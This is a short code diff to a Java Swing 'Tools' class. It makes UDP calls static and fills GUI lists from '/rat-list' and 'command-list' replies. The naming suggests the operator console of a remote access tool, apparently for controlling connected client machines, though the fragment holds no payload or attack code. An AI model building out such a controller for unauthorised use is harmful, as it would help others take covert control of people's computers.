@@ -7,11 +7,12 @@ import javax.swing.*;
 public class Tools {
     public static JSONParser.ClientJSON clientJSON;
     public static JSONParser.CommandsJSON commandsJSON;
-    public static void requestClientList(DefaultListModel<String> ClientListModel, UDPClient client){
-        client.sendString("/rat-list");
-        String json = client.receiveString();
 
-        refreshClientList(ClientListModel,json);
+    public static void requestClientList(DefaultListModel<String> ClientListModel) {
+        UDPClient.sendString("/rat-list");
+        String json = UDPClient.receiveString();
+
+        refreshClientList(ClientListModel, json);
     }
 
     public static void refreshClientList(DefaultListModel<String> ClientListModel, String json)
@@ -24,10 +25,10 @@ public class Tools {
         }
     }
 
-    public static void refreshCommandslist(DefaultListModel<String> ClientListModel, UDPClient client){
-        client.sendString("command-list");
+    public static void refreshCommandslist(DefaultListModel<String> ClientListModel){
+        UDPClient.sendString("command-list");
         ClientListModel.clear();
-        commandsJSON = JSONParser.getCommandsList(client.receiveString());
+        commandsJSON = JSONParser.getCommandsList(UDPClient.receiveString());
         for (int i = 0; i < commandsJSON.commands.length; i++){
             ClientListModel.add(i, commandsJSON.commands[i].name); // TODO: Finish refreshCommandslist()
         }
